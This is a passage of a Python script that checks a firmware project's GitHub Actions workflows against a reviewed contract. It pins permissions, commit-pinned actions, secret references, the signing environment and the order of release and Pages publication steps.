#!/usr/bin/env python3
"""Offline GitHub Actions trust-boundary and DAG contract with mutation canaries.

This checker deliberately validates Actions semantics rather than pretending its narrow workflow
scanner is a YAML parser. scripts/check-yaml-syntax.rb uses Ruby Psych for the real offline YAML
parse first; both are wired by scripts/repo-lint.sh and neither downloads actionlint or packages.
"""

from __future__ import annotations

import argparse
from collections import Counter
import hashlib
import os
from pathlib import Path
import re
import shutil
import subprocess
import sys
import tempfile


ACTION = re.compile(r"^\s+(?:-\s+)?uses:\s*([^\s#]+)", re.MULTILINE)
PINNED_ACTION = re.compile(r"^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+@[0-9a-f]{40}$")
JOB = re.compile(r"^  ([A-Za-z0-9_-]+):\s*$", re.MULTILINE)
UNPRIVILEGED_PERMISSIONS = {
    ("build.yml", "logic-test"): {"contents": "read"},
    ("build.yml", "build"): {"contents": "read", "pages": "read"},
    ("build.yml", "independent-rebuild"): {"contents": "read"},
    ("signed-pr-preview.yml", "validate"): {
        "actions": "read",
        "contents": "read",
        "pull-requests": "read",
    },
    ("signed-pr-preview.yml", "trusted-rebuild"): {"contents": "read"},
    ("bench-acceptance.yml", "ingest-report"): {"contents": "read"},
}

EXPECTED_WORKFLOW_JOBS = {
    "bench-acceptance.yml": {"ingest-report"},
    "build.yml": {"logic-test", "build", "independent-rebuild", "publish", "deploy"},
    "pr-policy.yml": {"current-head-records"},
    "pr-preview-cleanup.yml": {"cleanup-event", "discover-stale", "reconcile-stale"},
    "renovate.yaml": {"renovate"},
    "signed-pr-preview.yml": {"validate", "trusted-rebuild", "sign-preview"},
}

EXPECTED_TOP_LEVEL_PERMISSIONS = {
    "bench-acceptance.yml": {"contents": "read"},
    "build.yml": {"contents": "read"},
    "pr-policy.yml": {"contents": "read", "pull-requests": "read"},
    "pr-preview-cleanup.yml": {"contents": "read", "pull-requests": "read"},
    "renovate.yaml": {"contents": "read", "pull-requests": "write"},
    "signed-pr-preview.yml": {"contents": "read"},
}

EXPECTED_JOB_PERMISSIONS = {
    ("bench-acceptance.yml", "ingest-report"): {"contents": "read"},
    ("build.yml", "logic-test"): {"contents": "read"},
    ("build.yml", "build"): {"contents": "read", "pages": "read"},
    ("build.yml", "independent-rebuild"): {"contents": "read"},
    ("build.yml", "publish"): {"actions": "read", "contents": "write", "pages": "read"},
    ("build.yml", "deploy"): {
        "actions": "read", "contents": "write", "pages": "read",
    },
    ("pr-policy.yml", "current-head-records"): {
        "contents": "read", "pull-requests": "read",
    },
    ("pr-preview-cleanup.yml", "cleanup-event"): {
        "contents": "write", "pages": "read",
    },
    ("pr-preview-cleanup.yml", "discover-stale"): {
        "contents": "read", "pull-requests": "read",
    },
    ("pr-preview-cleanup.yml", "reconcile-stale"): {
        "contents": "write", "pages": "read", "pull-requests": "read",
    },
    ("renovate.yaml", "renovate"): {"contents": "read", "pull-requests": "write"},
    ("signed-pr-preview.yml", "validate"): {
        "actions": "read", "contents": "read", "pull-requests": "read",
    },
    ("signed-pr-preview.yml", "trusted-rebuild"): {"contents": "read"},
    ("signed-pr-preview.yml", "sign-preview"): {
        "actions": "read", "contents": "write", "pages": "read",
        "pull-requests": "read",
    },
}

EXPECTED_ACTIONS = {
    ("bench-acceptance.yml", "ingest-report"): (
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
        "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02",
    ),
    ("build.yml", "logic-test"): (
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
    ),
    ("build.yml", "build"): (
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
        "espressif/esp-idf-ci-action@e6f5c74232b1ccd4c97ed641f1e48553853f1fd5",
        "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
    ),
    ("build.yml", "independent-rebuild"): (
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
        "espressif/esp-idf-ci-action@e6f5c74232b1ccd4c97ed641f1e48553853f1fd5",
        "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
    ),
    ("build.yml", "publish"): (
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
        "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c",
        "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c",
        "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
        "softprops/action-gh-release@3d0d9888cb7fd7b750713d6e236d1fcb99157228",
    ),
    ("build.yml", "deploy"): (
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
        "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c",
    ),
    ("pr-policy.yml", "current-head-records"): (
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
    ),
    ("pr-preview-cleanup.yml", "cleanup-event"): (
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
    ),
    ("pr-preview-cleanup.yml", "discover-stale"): (
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
    ),
    ("pr-preview-cleanup.yml", "reconcile-stale"): (
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
    ),
    ("renovate.yaml", "renovate"): (
        "renovatebot/github-action@5402b206248e5a8c8427a15102702eb9c1793efc",
    ),
    ("signed-pr-preview.yml", "validate"): (),
    ("signed-pr-preview.yml", "trusted-rebuild"): (
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
        "espressif/esp-idf-ci-action@e6f5c74232b1ccd4c97ed641f1e48553853f1fd5",
        "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
    ),
    ("signed-pr-preview.yml", "sign-preview"): (
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
        "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c",
        "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c",
        "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
    ),
}

EXPECTED_SECRET_REFERENCES = {
    ("build.yml", "publish"): Counter({"OTA_SIGNING_KEY": 1}),
    ("build.yml", "deploy"): Counter({"GITHUB_TOKEN": 2}),
    ("pr-preview-cleanup.yml", "cleanup-event"): Counter({"GITHUB_TOKEN": 1}),
    ("pr-preview-cleanup.yml", "discover-stale"): Counter({"GITHUB_TOKEN": 1}),
    ("pr-preview-cleanup.yml", "reconcile-stale"): Counter({"GITHUB_TOKEN": 2}),
    ("renovate.yaml", "renovate"): Counter({"RENOVATE_TOKEN": 1}),
    ("signed-pr-preview.yml", "sign-preview"): Counter(
        {"OTA_SIGNING_KEY": 1, "GITHUB_TOKEN": 1}
    ),
}

SIGNING_ENVIRONMENT_JOBS = {
    ("build.yml", "publish"),
    ("signed-pr-preview.yml", "sign-preview"),
}

# These three jobs cross the real-key or repository-write boundary.  Their complete raw job bodies are
# reviewed allowlists: step order plus every name/uses/with/env/if/run byte is pinned.  Semantic
# checks below keep failures explanatory; this final digest closes gaps in the narrow scanner.
EXPECTED_PRIVILEGED_JOB_SHA256 = {
    ("build.yml", "publish"): "22c2ceeef6a0868703f10008e0d4f9f0b90458d5d2c9c66eb337c6919cc4d29c",
    ("build.yml", "deploy"): "cf1d70d6cf11600e3940ff58983a7101b75b191b8cdf10b8cfaebf60b20f2092",
    ("signed-pr-preview.yml", "sign-preview"): "28f478a1a8de7158561ac6929ddcbe64306fd4806fb3b4498b8a7f5f5e8d09ed",
}
TRUSTED_DEFAULT_ENV = "TRUSTED_DEFAULT_SHA: ${{ github.sha }}"
TRUSTED_DEFAULT_FETCH = "git fetch --no-tags origin"
TRUSTED_DEFAULT_COMPARE = 'if [ "$current_default" != "$TRUSTED_DEFAULT_SHA" ]; then'
SIGNED_ROOT_TEMPLATES = (
    "tesla-key-esp32.bin",
    "tesla-key-esp32-s3.bin",
    "tesla-key-esp32-c3.bin",
    "tesla-key-esp32-c6.bin",
    "tesla-key-esp32-{version}.bin",
    "tesla-key-esp32-s3-{version}.bin",
    "tesla-key-esp32-c3-{version}.bin",
    "tesla-key-esp32-c6-{version}.bin",
    "tesla-key-esp32-{version}-merged.bin",
    "tesla-key-esp32-s3-{version}-merged.bin",
    "tesla-key-esp32-c3-{version}-merged.bin",
    "tesla-key-esp32-c6-{version}-merged.bin",
)
SIGNED_STAGE_PATHS = tuple(
    f"_fw/{target}/{name}"
    for target in ("esp32", "esp32s3", "esp32c3", "esp32c6")
    for name in (
        "bootloader.bin", "partition-table.bin", "tesla-key-esp32.bin",
        "ota_data_initial.bin",
    )
)


class PolicyError(RuntimeError):
    pass


def require(condition: bool, message: str) -> None:
    if not condition:
        raise PolicyError(message)


def workflow_files(root: Path) -> list[Path]:
    directory = root / ".github/workflows"
    return sorted([*directory.glob("*.yml"), *directory.glob("*.yaml")])


def split_jobs(text: str, filename: str) -> tuple[str, dict[str, str]]:
    marker = re.search(r"^jobs:\s*$", text, re.MULTILINE)
    require(marker is not None, f"{filename}: top-level jobs map is missing")
    prefix = text[: marker.start()]
    body = text[marker.end():]
    matches = list(JOB.finditer(body))
    require(matches, f"{filename}: no jobs found")
    jobs: dict[str, str] = {}
    for index, match in enumerate(matches):
        end = matches[index + 1].start() if index + 1 < len(matches) else len(body)
        jobs[match.group(1)] = body[match.end():end]
    return prefix, jobs


def job_has_need(job: str, dependency: str) -> bool:
    single = re.search(r"^    needs:\s*([^\n#]+)", job, re.MULTILINE)
    if not single:
        return False
    value = single.group(1).strip()
    if value.startswith("[") and value.endswith("]"):
        return dependency in {part.strip() for part in value[1:-1].split(",")}
    return value == dependency


def job_permissions(job: str, label: str) -> dict[str, str]:
    marker = re.search(r"^    permissions:\s*$", job, re.MULTILINE)
    require(marker is not None, f"{label}: job-level permissions are missing")
    values: dict[str, str] = {}
    for line in job[marker.end():].splitlines():
        if line and not line.startswith("      "):
            break
        match = re.fullmatch(r"      ([a-z][a-z-]*):\s*(read|write|none)\s*", line)
        if match is None:
            continue
        require(match.group(1) not in values, f"{label}: duplicate permission {match.group(1)}")
        values[match.group(1)] = match.group(2)
    require(values, f"{label}: job-level permissions map is empty")
    return values


def top_level_permissions(prefix: str, label: str) -> dict[str, str]:
    marker = re.search(r"^permissions:\s*$", prefix, re.MULTILINE)
    require(marker is not None, f"{label}: top-level permissions must be explicit")
    values: dict[str, str] = {}
    for line in prefix[marker.end():].splitlines():
        if line and not line.startswith("  "):
            break
        match = re.fullmatch(r"  ([a-z][a-z-]*):\s*(read|write|none)\s*", line)
        if match is None:
            continue
        require(match.group(1) not in values,
                f"{label}: duplicate top-level permission {match.group(1)}")
        values[match.group(1)] = match.group(2)
    require(values, f"{label}: top-level permissions map is empty")
    return values


def validate_unprivileged_job(filename: str, name: str, job: str) -> None:
    label = f"{filename}:{name}"
    expected = UNPRIVILEGED_PERMISSIONS[(filename, name)]
    require(job_permissions(job, label) == expected,
            f"{label}: unprivileged permissions must be exact and read-only: {expected}")
    require(re.search(r"^    environment:\s*", job, re.MULTILINE) is None,
            f"{label}: unprivileged job must not declare an Environment")
    require("secrets." not in job and "OTA_SIGNING_KEY" not in job,
            f"{label}: unprivileged job must not reference secrets or the OTA key")
    require("id-token" not in job and not any(value == "write" for value in expected.values()),
            f"{label}: unprivileged job must not receive write or id-token scope")


def literal_run_blocks(job: str) -> tuple[str, ...]:
    blocks: list[str] = []
    pattern = re.compile(r"^        run: \|\n((?:^          .*\n)+)", re.MULTILINE)
    for match in pattern.finditer(job):
        blocks.append("\n".join(line[10:] for line in match.group(1).splitlines()))
    return tuple(blocks)


def signed_root_upload_paths(job: str) -> Counter[str]:
    return Counter(
        re.findall(r"^            (tesla-key-esp32[^\n]*\.bin)\s*$", job, re.MULTILINE)
    )


def signed_stage_upload_paths(job: str) -> Counter[str]:
    return Counter(re.findall(r"^            (_fw/[^\n]+)\s*$", job, re.MULTILINE))


def validate(root: Path) -> None:
    files = workflow_files(root)
    require(files, "no workflow files found")
    actual_files = {path.name for path in files}
    require(
        actual_files == set(EXPECTED_WORKFLOW_JOBS),
        "workflow file inventory drift: "
        f"missing={sorted(set(EXPECTED_WORKFLOW_JOBS) - actual_files)}, "
        f"unreviewed={sorted(actual_files - set(EXPECTED_WORKFLOW_JOBS))}",
    )
    contents: dict[str, str] = {}
    jobs_by_file: dict[str, dict[str, str]] = {}

    for path in files:
        text = path.read_text(encoding="utf-8")
        name = path.name
        contents[name] = text
        require("\t" not in text, f"{name}: tabs are forbidden in YAML")
        require(text.endswith("\n"), f"{name}: missing final newline")
        prefix, jobs = split_jobs(text, name)
        jobs_by_file[name] = jobs
        require(
            set(jobs) == EXPECTED_WORKFLOW_JOBS[name],
            f"{name}: job inventory drift: "
            f"missing={sorted(EXPECTED_WORKFLOW_JOBS[name] - set(jobs))}, "
            f"unreviewed={sorted(set(jobs) - EXPECTED_WORKFLOW_JOBS[name])}",
        )
        require(
            top_level_permissions(prefix, name) == EXPECTED_TOP_LEVEL_PERMISSIONS[name],
            f"{name}: top-level permissions must be exact: "
            f"{EXPECTED_TOP_LEVEL_PERMISSIONS[name]}",
        )
        require("write-all" not in text and "read-all" not in text,
                f"{name}: broad permissions shortcut is forbidden")
        for use in ACTION.findall(text):
            require(PINNED_ACTION.fullmatch(use) is not None,
                    f"{name}: action is not pinned to one lowercase 40-hex commit: {use}")
        for job_name, job in jobs.items():
            key = (name, job_name)
            require(
                job_permissions(job, f"{name}:{job_name}") == EXPECTED_JOB_PERMISSIONS[key],
                f"{name}:{job_name}: permissions must match the exact reviewed inventory: "
                f"{EXPECTED_JOB_PERMISSIONS[key]}",
            )
            require(
                tuple(ACTION.findall(job)) == EXPECTED_ACTIONS[key],
                f"{name}:{job_name}: action inventory drift",
            )
            actual_secrets = Counter(re.findall(r"\bsecrets\.([A-Za-z_][A-Za-z0-9_]*)", job))
            require(
                actual_secrets == EXPECTED_SECRET_REFERENCES.get(key, Counter()),
                f"{name}:{job_name}: secret reference inventory drift",
            )
            environments = re.findall(r"^    environment:\s*([^\n#]+?)\s*$", job, re.MULTILINE)
            expected_environment = key in SIGNING_ENVIRONMENT_JOBS
            require(
                environments == (["firmware-signing"] if expected_environment else []),
                f"{name}:{job_name}: protected Environment inventory drift",
            )
            require(re.search(r"^    runs-on:\s*[^\n]+", job, re.MULTILINE) is not None,
                    f"{name}:{job_name}: runs-on is missing")
            require(re.search(r"^    timeout-minutes:\s*[1-9][0-9]*\s*$", job, re.MULTILINE) is not None,
                    f"{name}:{job_name}: positive timeout-minutes is missing")

    for (filename, job_name), _permissions in UNPRIVILEGED_PERMISSIONS.items():
        jobs = jobs_by_file.get(filename)
        require(jobs is not None and job_name in jobs,
                f"{filename}:{job_name}: required unprivileged job is missing")
        validate_unprivileged_job(filename, job_name, jobs[job_name])

    build = jobs_by_file.get("build.yml")
    require(build is not None, "build.yml is missing")
    for name in ("logic-test", "build", "independent-rebuild", "publish", "deploy"):
        require(name in build, f"build.yml:{name} job is missing")
    require(job_has_need(build["build"], "logic-test"), "build.yml:build must need logic-test")
    require(job_has_need(build["independent-rebuild"], "build"),
            "build.yml:independent-rebuild must need build")
    require(job_has_need(build["publish"], "build") and
            job_has_need(build["publish"], "independent-rebuild"),
            "build.yml:publish must need both producer and independent rebuild")
    require(
        job_has_need(build["deploy"], "build") and job_has_need(build["deploy"], "publish"),
        "build.yml:deploy must need both build and successful immutable Release publication",
    )
    require("./scripts/run-mock-tests.sh --require-all" in build["logic-test"],
            "build.yml:logic-test must run the fail-closed host gate")
    require("./scripts/repo-lint.sh" in build["logic-test"],
            "build.yml:logic-test must run offline repository lint")
    require("./scripts/run-sanitizer-tests.sh --self-test" in build["logic-test"] and
            "./scripts/run-sanitizer-tests.sh" in build["logic-test"],
            "build.yml:logic-test must prove and run ASan/UBSan/LSan")
    require("python3 scripts/check-build-gate-contract.py --self-test" in build["logic-test"],
            "build.yml:logic-test must run the mutation-tested four-target build contract")
    build_refs = re.findall(r"^\s+ref:\s*([^\n#]+?)\s*$", build["build"], re.MULTILINE)
    require(build_refs == ["${{ github.event.pull_request.head.sha || github.sha }}"],
            "build.yml:build must check out the exact PR head (or push SHA)")
    require(
        '"${{ github.event.pull_request.head.sha || github.sha }}"' in build["build"] and
        "./scripts/ci-build-verify.sh" in build["build"]
        and "actions/cache@" not in build["build"]
        and "cache-hash" not in build["build"]
        and "cache-scope" not in build["build"],
        "build.yml:build provenance must bind ci-build-verify to the exact PR head",
    )
    rebuild_refs = re.findall(
        r"^\s+ref:\s*([^\n#]+?)\s*$", build["independent-rebuild"], re.MULTILINE
    )
    require(
        rebuild_refs == ["${{ github.sha }}"]
        and "./scripts/ci-build-all.sh" in build["independent-rebuild"]
        and "printf '%s\\n' \"$DISPLAY_VERSION\" > version.txt" in build["independent-rebuild"]
        and '"${{ github.sha }}"' in build["independent-rebuild"]
        and "name: firmware-independent-rebuild" in build["independent-rebuild"]
        and "if: github.event_name == 'push' && github.ref == 'refs/heads/main'"
        in build["independent-rebuild"]
        and "environment:" not in build["independent-rebuild"]
        and "contents: write" not in build["independent-rebuild"]
        and "actions/cache@" not in build["independent-rebuild"],
        "build.yml:independent-rebuild must be exact-head, key/write/environment/cache-free",
    )
    require("environment: firmware-signing" in build["publish"],
            "build.yml:publish must retain the signing environment")
    require(
        job_permissions(build["publish"], "build.yml:publish")
        == {"actions": "read", "contents": "write", "pages": "read"},
        "build.yml:publish permissions must be exact for artifacts, Release mutation and Pages authority",
    )
    require("id-token" not in build["publish"],
            "build.yml:publish must not retain an unused OIDC permission")
    require("github.ref == 'refs/heads/main'" in build["publish"] and
            "github.event_name == 'push'" in build["publish"],
            "build.yml:publish must remain main-push-only")
    publish_refs = re.findall(r"^\s+ref:\s*([^\n#]+?)\s*$", build["publish"], re.MULTILINE)
    require(
        publish_refs == ["${{ github.sha }}"]
        and build["publish"].count("persist-credentials: false") == 1,
        "build.yml:publish checkout must be exact-SHA and must not persist credentials",
    )
    require(
        job_permissions(build["deploy"], "build.yml:deploy")
        == {"actions": "read", "contents": "write", "pages": "read"}
        and "environment:" not in build["deploy"]
        and "OTA_SIGNING_KEY" not in build["deploy"]
        and "id-token" not in build["deploy"],
        "build.yml:deploy must have exact branch-deployment scope without signer/OIDC authority",
    )
    require(
        "github.ref == 'refs/heads/main'" in build["deploy"]
        and "github.event_name == 'push'" in build["deploy"],
        "build.yml:deploy must remain main-push-only",
    )
    deploy_refs = re.findall(r"^\s+ref:\s*([^\n#]+?)\s*$", build["deploy"], re.MULTILINE)
    require(
        deploy_refs == ["${{ github.sha }}"]
        and build["deploy"].count("persist-credentials: false") == 1,
        "build.yml:deploy checkout must be exact-SHA and must not persist credentials",
    )
    require(build["publish"].count("python3 scripts/check-release-assets.py") == 3,
            "build.yml:publish must validate mode metadata plus draft and published Release bytes")
    require(
        "Classify first publication or immutable reuse" in build["publish"]
        and "id: release-mode" in build["publish"]
        and 'mode=reuse' in build["publish"]
        and 'mode=create' in build["publish"]
        and "Reuse and stage exact immutable Release bytes" in build["publish"]
        and "gh release download" in build["publish"]
        and "python3 scripts/prepare-reused-release.py" in build["publish"]
        and "_reuse-release.json _release-reuse-download . ./_fw" in build["publish"]
        and "--expect-state published-immutable" in build["publish"]
        and "Create draft release" in build["publish"]
        and "draft: true" in build["publish"]
        and "fail_on_unmatched_files: true" in build["publish"]
        and "Bind complete draft Release and publish exact candidate" in build["publish"]
        and "--expect-state draft" in build["publish"]
        and 'gh api --method PATCH "repos/$GITHUB_REPOSITORY/releases/$release_id"'
        in build["publish"]
        and "Refetch and accept immutable published Release" in build["publish"]
        and "--expect-state published-immutable" in build["publish"],
        "build.yml:publish must fail-closed between first publication and immutable reuse",
    )
    publication = build["publish"]
    required_publication_markers = (
        "Classify first publication or immutable reuse",
        "Reuse and stage exact immutable Release bytes",
        "Provision OTA signing key",
        "Verify production signing authority for all staged apps",
        "Assemble local Pages candidate before any publication",
        "python3 scripts/check-release-pages-bytes.py",
        "Upload signed firmware artifacts",
        "Create draft release",
        "--expect-state draft",
        'gh api --method PATCH "repos/$GITHUB_REPOSITORY/releases/$release_id"',
        "Refetch and accept immutable published Release",
        "--expect-state published-immutable",
    )
    require(
        all(marker in publication for marker in required_publication_markers),
        "build.yml:publish required local 16/16 Pages/create/reuse Release stage is missing",
    )
    require(
        publication.index("Classify first publication or immutable reuse")
        < publication.index("Reuse and stage exact immutable Release bytes")
        < publication.index("Provision OTA signing key")
        < publication.index("Verify production signing authority for all staged apps"),
        "build.yml:publish create/reuse staging order drifted",
    )
    require(
        publication.index("Verify production signing authority for all staged apps")
        < publication.index("Assemble local Pages candidate before any publication")
        < publication.index("python3 scripts/check-release-pages-bytes.py")
        < publication.index("Upload signed firmware artifacts")
        < publication.index("Create draft release"),
        "build.yml:publish local 16/16 Pages must precede signed upload and draft creation",
    )
    require(
        publication.index("Create draft release")
        < publication.index("--expect-state draft")
        < publication.index('gh api --method PATCH "repos/$GITHUB_REPOSITORY/releases/$release_id"')
        < publication.index("Refetch and accept immutable published Release")
        < publication.rindex("--expect-state published-immutable"),
        "build.yml:publish draft bind/publish/immutable acceptance order drifted",
    )
    require(
        "publish-pages-branch.sh" not in publication
        and "check-published-release.py" not in publication
        and "secrets.GITHUB_TOKEN" not in publication,
        "build.yml:publish must stop after immutable Release acceptance and never mutate Pages",
    )
    require(
        build["publish"].count("if: steps.release-mode.outputs.mode == 'create'") == 7
        and build["publish"].count("if: steps.release-mode.outputs.mode == 'reuse'") == 1
        and "if: always() && steps.release-mode.outputs.mode == 'create'" in build["publish"]
        and "Release appeared after create-mode classification; refusing key provisioning"
        in build["publish"],
        "build.yml:publish key/sign/Release mutation must be create-only and reuse must remain key-free",
    )
    require(
        "check-build-artifact-inventory.py" in build["publish"]
        and "--compare-to _ci-independent" in build["publish"]
        and build["publish"].index("check-build-artifact-inventory.py")
        < build["publish"].index("Provision OTA signing key")
        and '"$DISPLAY_VERSION" _unsigned "$SOURCE_SHA" . _ci-independent'
        in build["publish"],
        "build.yml:publish must compare independent bytes before signer private staging",
    )
    candidate_check = (
        './scripts/select-release-version.sh --require-release-candidate '
        '"$SOURCE_SHA" "$DISPLAY_VERSION"'
    )
    signed_upload_revalidation = (
        "Revalidate current Release candidate immediately before signed artifact upload"
    )
    signed_upload = "- name: Upload signed firmware artifacts"
    production_key_gate = "Verify production signing authority for all staged apps"
    require(
        build["publish"].count(candidate_check) == 7
        and build["publish"].count("--expected-public-key-digest") == 3
        and build["publish"].count("scripts/ota-signing-public-key.sha256") == 3
        and production_key_gate in build["publish"]
        and signed_upload_revalidation in build["publish"]
        and build["publish"].index("Reuse and stage exact immutable Release bytes")
        < build["publish"].index(production_key_gate)
        and build["publish"].index("Sign and stage release artifacts")
        < build["publish"].index(production_key_gate)
        < build["publish"].index(signed_upload_revalidation)
        < build["publish"].index(signed_upload),
        "build.yml:publish must pin all four production signatures and revalidate identity before signed artifact upload",
    )
    require(
        candidate_check
        + '\n          python3 scripts/check-signed-root-inventory.py . --version "$DISPLAY_VERSION"'
        + "\n\n      - name: Upload signed firmware artifacts"
        in build["publish"],
        "build.yml:publish signed artifact upload must be adjacent to candidate and root-inventory revalidation",
    )
    patch_command = 'gh api --method PATCH "repos/$GITHUB_REPOSITORY/releases/$release_id"'
    require(
        candidate_check + "\n          " + patch_command in build["publish"],
        "build.yml:publish must refresh current main/tag authority immediately before draft publication",
    )
    require(
        "python3 scripts/prepare-reused-release.py" in build["publish"]
        and "--version \"$DISPLAY_VERSION\" --source-sha \"$SOURCE_SHA\"" in build["publish"]
        and "RELEASE_MODE: ${{ steps.release-mode.outputs.mode }}" in build["publish"]
        and 'release_dir=_release-reuse-download' in build["publish"]
        and './_site "$release_dir" --version "$DISPLAY_VERSION"' in build["publish"],
        "build.yml:publish must build and bind Pages from exact reused immutable Release bytes",
    )
    root_pages_check = "python3 scripts/check-release-pages-bytes.py"
    require(
        root_pages_check in build["publish"]
        and build["publish"].index(root_pages_check)
        < build["publish"].index(signed_upload_revalidation)
        < build["publish"].index(signed_upload)
        < build["publish"].index("Create draft release"),
        "build.yml:publish must bind all local 16/16 Pages parts before any upload, "
        "or Release publication",
    )
    pages_source_check = "python3 scripts/check-pages-source.py"
    require(
        build["publish"].count(pages_source_check) == 1,
        "build.yml:publish must validate branch-backed Pages once before entering the signing boundary",
    )
    main_root_paths = Counter(
        {
            template.format(version="${{ needs.build.outputs.display-version }}"): 2
            for template in SIGNED_ROOT_TEMPLATES
        }
    )
    require(
        signed_root_upload_paths(build["publish"]) == main_root_paths
        and build["publish"].count("python3 scripts/check-signed-root-inventory.py .") == 2
        and "tesla-key-esp32*.bin" not in build["publish"],
        "build.yml:publish must gate and explicitly list the exact 12 root BINs before both uploads",
    )
    exact_main_artifact_name = (
        "name: tesla-key-esp32-${{ needs.build.outputs.display-version }}-${{ github.sha }}"
    )
    require(
        exact_main_artifact_name in build["publish"]
        and exact_main_artifact_name in build["deploy"],
        "build.yml publish/deploy must share one exact SHA/version-bound artifact identity",
    )
    require(
        signed_stage_upload_paths(build["publish"])
        == Counter({path: 1 for path in SIGNED_STAGE_PATHS}),
        "build.yml:publish must explicitly upload the exact 16 signer-owned layout inputs",
    )
    forbidden_pages_actions = (
        "actions/configure-pages@",
        "actions/upload-pages-artifact@",
        "actions/deploy-pages@",
    )
    require(
        not any(action in text for text in contents.values() for action in forbidden_pages_actions),
        "workflows must not mix Actions Pages deployment with gh-pages branch authority",
    )
    deploy = build["deploy"]
    deploy_download = "Download exact signed Release and Pages candidate"
    deploy_inventory = "python3 scripts/check-signed-root-inventory.py ./_deploy-input"
    deploy_manifest = "python3 scripts/check-pages-manifest.py ./_deploy-input/_site"
    deploy_bytes = "python3 scripts/check-release-pages-bytes.py"
    deploy_authority = "Revalidate branch-backed Pages authority immediately before deployment"
    deploy_push = "- name: Deploy root site to gh-pages"
    deploy_accept = "Accept branch-served Pages against immutable Release bytes"
    require(
        "name: tesla-key-esp32-${{ needs.build.outputs.display-version }}-${{ github.sha }}"
        in deploy
        and "path: _deploy-input" in deploy
        and deploy.count(pages_source_check) == 2
        and "./scripts/select-release-version.sh --require-published-release" in deploy
        and 'python3 scripts/check-release-assets.py "$release_json" ./_deploy-input'
        in deploy
        and "--expect-state published-immutable" in deploy
        and "--expected-public-key-digest scripts/ota-signing-public-key.sha256" in deploy,
        "build.yml:deploy must download the exact SHA/version artifact and revalidate Pages plus immutable Release authority",
    )
    require(
        deploy.index(deploy_download)
        < deploy.index(deploy_inventory)
        < deploy.index(deploy_manifest)
        < deploy.index(deploy_bytes)
        < deploy.index(deploy_authority)
        < deploy.index("./scripts/select-release-version.sh --require-published-release")
        < deploy.index('python3 scripts/check-release-assets.py "$release_json" ./_deploy-input')
        < deploy.index(deploy_push)
        < deploy.index(deploy_accept),
        "build.yml:deploy artifact validation/authority/branch push/live acceptance order drifted",
    )
    require(
        "            --expected-public-key-digest scripts/ota-signing-public-key.sha256\n\n"
        "      - name: Deploy root site to gh-pages"
        in deploy,
        "build.yml:deploy branch mutation must be adjacent to full immutable Release byte revalidation",
    )
    final_release_api = (
        'gh api "repos/$GITHUB_REPOSITORY/releases/tags/v$RELEASE_VERSION" > "$release_json"'
    )
    final_release_check = "python3 scripts/check-published-release.py"
    final_release_arg = '--release-json "$release_json"'
    require(
        final_release_api in deploy
        and final_release_check in deploy
        and final_release_arg in deploy
        and deploy.index(deploy_push) < deploy.rindex(final_release_api)
        < deploy.index(final_release_check),
        "build.yml:deploy must fetch fresh immutable Release metadata after branch publication",
    )
    require("contents: write" not in build["logic-test"] and "contents: write" not in build["build"],
            "build.yml: untrusted build jobs must not write repository contents")

    signed_text = contents.get("signed-pr-preview.yml", "")
    signed = jobs_by_file.get("signed-pr-preview.yml")
    require(
        re.search(r"^  workflow_run:\s*$", signed_text, re.MULTILINE) is not None
        and "workflows: [build]" in signed_text
        and "types: [completed]" in signed_text,
        "signed-pr-preview.yml must remain a default-branch-owned completed-build workflow_run",
    )
    require(signed is not None and {"validate", "trusted-rebuild", "sign-preview"} <= set(signed),
            "signed-pr-preview.yml jobs are incomplete")
    require(job_has_need(signed["trusted-rebuild"], "validate"),
            "signed-pr-preview.yml:trusted-rebuild must need validate")
    require(job_has_need(signed["sign-preview"], "validate") and
            job_has_need(signed["sign-preview"], "trusted-rebuild"),
            "signed-pr-preview.yml:sign-preview must need validation and trusted rebuild")
    trusted_rebuild = signed["trusted-rebuild"]
    require(
        "ref: ${{ github.sha }}\n          fetch-depth: 0" in trusted_rebuild
        and "ref: ${{ needs.validate.outputs.head-sha }}\n          fetch-depth: 0"
        in trusted_rebuild
        and "./scripts/select-release-version.sh --latest-published-stable" in trusted_rebuild
        and "./scripts/ci-build-all.sh" in trusted_rebuild
        and "cd _ci-rebuild-source" not in trusted_rebuild
        and "working-directory:" not in trusted_rebuild
        and "name: trusted-preview-rebuild-${{ needs.validate.outputs.head-sha }}"
        in trusted_rebuild
        and "actions/cache@" not in trusted_rebuild
        and "actions/download-artifact@" not in trusted_rebuild
        and "firmware-unsigned" not in trusted_rebuild,
        "signed-pr-preview.yml:trusted-rebuild must be default-owned, exact-head, "
        "producer-path-compatible and primary-isolated",
    )
    require("environment: firmware-signing" in signed["sign-preview"],
            "signed-pr-preview.yml signing job lost its protected environment")
    require(
        job_permissions(signed["sign-preview"], "signed-pr-preview.yml:sign-preview")
        == {
            "actions": "read",
            "contents": "write",
            "pages": "read",
